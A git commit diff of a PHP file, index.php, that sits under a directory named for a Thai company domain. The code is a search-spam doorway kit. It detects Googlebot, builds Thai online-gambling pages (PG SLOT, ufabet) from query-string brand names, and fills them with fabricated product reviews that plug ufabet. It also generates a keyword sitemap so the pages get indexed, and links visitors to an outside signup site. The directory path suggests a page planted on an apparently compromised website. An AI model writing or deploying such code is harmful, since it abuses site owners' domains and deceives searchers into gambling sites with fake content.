46c7d329ac5bda1a5ccbc46e4f5c2374aa919a99
awasludongo <awasludongo@gmail.com>
2025-06-02 19:53:21 +0700

    Update index.php

--- falco.co.th/video/index.php
+++ falco.co.th/video/index.php
@@ -1,109 +1,115 @@
 <?php
-    $ip = isset($_SERVER['HTTP_X_REAL_IP']) ? $_SERVER['HTTP_X_REAL_IP'] : $_SERVER['REMOTE_ADDR'];
-    $userAgent = $_SERVER['HTTP_USER_AGENT'];
+// Tampilkan semua error untuk debugging (hilangkan di production)
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
 
-    $basePath = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == "on") ? "https": "http");
-    $basePath .= "://".$_SERVER['HTTP_HOST'];
+// Dapatkan IP user
+$ip = $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'];
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
 
-    $baseUrl = $basePath . $_SERVER['REQUEST_URI'];
+// Base URL
+$basePath = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == "on") ? "https" : "http";
+$basePath .= "://" . $_SERVER['HTTP_HOST'];
+$requestUri = $_SERVER['REQUEST_URI'] ?? '';
+$baseUrl = $basePath . $requestUri;
 
-    $googleBotUserAgents = [
-        "Googlebot",
-        "Googlebot-Image",
-        "Googlebot-News",
-        "Googlebot-Video",
-        "Google-InspectionTool",
-        "Google-Site-Verification"
-    ];
-    $isGooglebot = false;
-    foreach ($googleBotUserAgents as $googleUserAgent) {
-        if (stripos($userAgent, $googleUserAgent) !== false) {
-            $isGooglebot = true;
-            break;
+// Deteksi Googlebot
+$googleBotUserAgents = [
+    "Googlebot", "Googlebot-Image", "Googlebot-News",
+    "Googlebot-Video", "Google-InspectionTool", "Google-Site-Verification"
+];
+$isGooglebot = false;
+foreach ($googleBotUserAgents as $googleUserAgent) {
+    if (stripos($userAgent, $googleUserAgent) !== false) {
+        $isGooglebot = true;
+        break;
+    }
+}
+
+// Load param.txt
+$paramFile = __DIR__ . '/param.txt';
+if (!file_exists($paramFile)) {
+    die('param.txt not found');
+}
+$validKeys = preg_split('/\s+/', file_get_contents($paramFile));
+
+// Ambil param key yang valid
+function getValidKey($validKeys) {
+    foreach ($validKeys as $key) {
+        if (isset($_GET[$key])) {
+            return $key;
         }
     }
+    return null;
+}
 
-    
-    $paramFile = __DIR__ . '/param.txt';
-    $validKeys = explode(' ', file_get_contents($paramFile));
+$key = getValidKey($validKeys);
+if ($key === null) {
+    http_response_code(404);
+    echo '404 not found xx00xx';
+    die;
+}
 
-    
-    function getValidKey($validKeys) {
-        foreach ($validKeys as $key) {
-            if (isset($_GET[$key])) {
-                return $key;
-            }
-        }
-        return null;
-    }
+$brand = $_GET[$key] ?? '';
+$domain = $_SERVER['HTTP_HOST'];
 
-    $key = getValidKey($validKeys);
+// Links
+$signUp = 'https://listrik.org/publicenemy';
+$banner = 'https://image.cdn2.seaart.me/temp-convert-webp/highwebp/2024-12-30/ctpd8cte878c7383guug/1382b4ae7a421bb3eec4b54077815120_low.webp';
+$favicon = 'https://i.ibb.co/WpkxNbR/icon.png';
+$logo = 'https://i.ibb.co/HPqvPf8/logo.png';
+$brandUp = strtoupper($brand);
 
-    
-    function getUrl($keyword, $key) {
-        global $basePath;
-        $url = $basePath . $_SERVER['REQUEST_URI'] . "?{$key}=" . str_replace(' ', '+', $keyword);
-        return str_replace("?{$key}=sitemap.xml", '', $url);
-    }
+// Load keywords
+$keywordsFile = __DIR__ . '/thaikeyword.txt';
+if (!file_exists($keywordsFile)) {
+    die('thaikeyword.txt not found');
+}
+$contents = file_get_contents($keywordsFile);
+$keywords = preg_split('/\r\n|\r|\n/', $contents);
 
-    
-    if ($key === null) {
-        echo '404 not found xx00xx';
-        die;
-    }
-
-    $domain = $_SERVER['HTTP_HOST'];
-    $brand = $_GET[$key];
-    $signUp = 'https://listrik.org/publicenemy';
-	$banner = 'https://image.cdn2.seaart.me/temp-convert-webp/highwebp/2024-12-30/ctpd8cte878c7383guug/1382b4ae7a421bb3eec4b54077815120_low.webp';
-    $favicon = 'https://i.ibb.co/WpkxNbR/icon.png';
-    $logo = 'https://i.ibb.co/HPqvPf8/logo.png';
-    $brandUp = strtoupper($brand);
-
-    $contents = file_get_contents(__DIR__ . '/thaikeyword.txt');
-    $keywords = explode("\r\n", $contents);
-
+// Title & descriptions
 $title = "{$brand} แนะนำ PG SLOT เกมแนวผจญภัยในดินแดนลึกลับที่เต็มไปด้วยสมบัติและความท้าทาย";
 $description = "{$brand} พัฒนา PG SLOT เวอร์ชันใหม่ที่ผู้เล่นจะได้ผจญภัยในดินแดนลึกลับ ต่อสู้กับสัตว์ประหลาดและค้นหาสมบัติที่ซ่อนอยู่";
 $article = "ในปีนี้ {$brand} เปิดตัว PG SLOT ธีมผจญภัยสุดมันส์ที่ผู้เล่นจะได้ออกเดินทางผ่านป่า ภูเขา และถ้ำลึกลับ พร้อมทั้งลุ้นโบนัสพิเศษจากการไขปริศนาและค้นหาสมบัติที่ซ่อนอยู่ สนุก ตื่นเต้น และเร้าใจอย่างที่ไม่เคยมีมาก่อน.";
 
-$reviews_user1 = "pgslot";
-$reviews_user2 = "ufabet";
-$reviews_user3 = "pgfish";
+// User reviews
+$reviews = [
+    "pgslot" => "ฉันซื้อหูฟังสำหรับเล่นเกมจากร้านนี้และคุณภาพดีมาก! บริการเป็นกันเอง จัดส่งรวดเร็ว...",
+    "ufabet" => "เสื้อผ้าโอเคตามภาพเนื้อผ้าเย็นใส่สบายค่ะ ขนาดก็พอดีเป๊ะเลย ส่งเร็วอีกแล้ว...",
+    "pgfish" => "เคสโทรศัพท์ที่ฉันซื้อที่นี่ดูเท่และไม่ซ้ำใคร! ราคาถูก คุณภาพดี และให้บริการตอบกลับรวดเร็ว..."
+];
 
-$content_user1 = "ฉันซื้อหูฟังสำหรับเล่นเกมจากร้านนี้และคุณภาพดีมาก! บริการเป็นกันเอง จัดส่งรวดเร็ว เหมาะกับคนที่เล่นเกมออนไลน์บ่อยๆเหมือนผมจริงๆ แม้แต่ตอนเล่นบน ufabet เสียงก็ยังชัดเจนมากทำให้ประสบการณ์ตื่นเต้นมากยิ่งขึ้น แน่นอนจะกลับมาซื้อของที่นี่อีกครั้ง!";
-$content_user2 = "เสื้อผ้าโอเคตามภาพเนื้อผ้าเย็นใส่สบายค่ะ ขนาดก็พอดีเป๊ะเลย ส่งเร็วอีกแล้ว. เมื่อวานลองใช้ไลฟ์สดกับเพื่อนๆในกลุ่ม ufabet แล้วคนถามมาเยอะว่าซื้อได้ที่ไหน ที่แนะนำ!";
-$content_user3 = "เคสโทรศัพท์ที่ฉันซื้อที่นี่ดูเท่และไม่ซ้ำใคร! ราคาถูก คุณภาพดี และให้บริการตอบกลับรวดเร็ว ผมชอบมากเพราะว่าสามารถเล่นและพูดคุยกับชุมชน ufabet ได้แบบเห็นความแตกต่าง ร้านนี้เป็นหนึ่งในร้านที่ต้องอยู่ในรายการความต้องการของคุณ!";
+// Cek mobile device
+function isMobile($userAgent) {
+    return preg_match('/(android|iphone|ipod|ipad|blackberry|bb\d+|meego|avantgo|bada\/|windows phone)/i', $userAgent);
+}
 
+// Generate URL dengan separator aman
+function getUrl($keyword, $key) {
+    global $basePath, $requestUri;
+    $separator = (strpos($requestUri, '?') !== false) ? '&' : '?';
+    $url = $basePath . $requestUri . $separator . "{$key}=" . urlencode($keyword);
+    return str_replace("{$separator}{$key}=sitemap.xml", '', $url);
+}
 
-    function isMobile() {
-        global $userAgent;
-        return preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i',$userAgent)||preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i',substr($userAgent,0,4));
-    }
-
-    
-    if ($brand == 'sitemap.xml') {
-        header('Content-Type: application/xml');
-        header('Accept-Ranges: bytes');
-
-        $xml = new SimpleXMLElement('<?xml version="1.0" encoding="UTF-8"?><urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"></urlset>');
-
-        foreach ($keywords as $keyword) {
-            foreach ($validKeys as $paramKey) {
-                $urlElement = $xml->addChild('url');
-                $urlElement->addChild('loc', htmlspecialchars(getUrl($keyword, $paramKey)));
-                $urlElement->addChild('lastmod', date('Y-m-d'));
-                $urlElement->addChild('changefreq', 'daily');
-                $urlElement->addChild('priority', '0.8');
-            }
+// Sitemap handler
+if ($brand === 'sitemap.xml') {
+    header('Content-Type: application/xml; charset=UTF-8');
+    $xml = new SimpleXMLElement('<?xml version="1.0" encoding="UTF-8"?><urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"></urlset>');
+    foreach ($keywords as $keyword) {
+        foreach ($validKeys as $paramKey) {
+            $urlElement = $xml->addChild('url');
+            $urlElement->addChild('loc', htmlspecialchars(getUrl($keyword, $paramKey)));
+            $urlElement->addChild('lastmod', date('Y-m-d'));
+            $urlElement->addChild('changefreq', 'daily');
+            $urlElement->addChild('priority', '0.8');
         }
-
-        echo $xml->asXML();
-        exit;
     }
-    
-   
-   
+    echo $xml->asXML();
+    exit;
+} 
 ?>
 
 <!doctype html>
